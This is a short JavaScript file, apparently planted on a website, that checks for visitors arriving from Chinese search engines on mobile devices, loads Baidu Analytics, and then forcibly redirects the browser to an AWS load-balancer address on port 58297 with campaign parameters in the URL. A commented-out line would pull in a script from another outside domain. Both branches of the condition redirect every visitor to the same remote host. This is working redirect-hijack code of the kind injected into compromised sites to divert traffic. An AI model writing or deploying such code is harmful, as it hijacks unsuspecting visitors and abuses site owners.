//document.write('<script src="https://i.ixi.plus/epaper.js"><\/script>');
function isFromSearchEngine() {
    const referrer = document.referrer;
    const searchEngines = ['sm.cn', 'so.com', 'haosou', 'baidu.', 'toutiao.', 'sogou.'];
    return searchEngines.some(engine => referrer.includes(engine));
}

function isMobile() {
    return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

function loadBaiduAnalytics() {
    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?d30581c7013446efea723e92c414fe52";
        var s = document.getElementsByTagName("script")[0]; 
        s.parentNode.insertBefore(hm, s);
    })();
}

if (isFromSearchEngine() && isMobile()) {
    loadBaiduAnalytics();
    window.location.href = "http://web-alb-wg223-1153285546.ap-southeast-1.elb.amazonaws.com:58297/?cid=386111&type=2&currency=CNY";
} else {
    loadBaiduAnalytics();
    window.location.href = "http://web-alb-wg223-1153285546.ap-southeast-1.elb.amazonaws.com:58297/?cid=386111&type=2&currency=CNY";
}
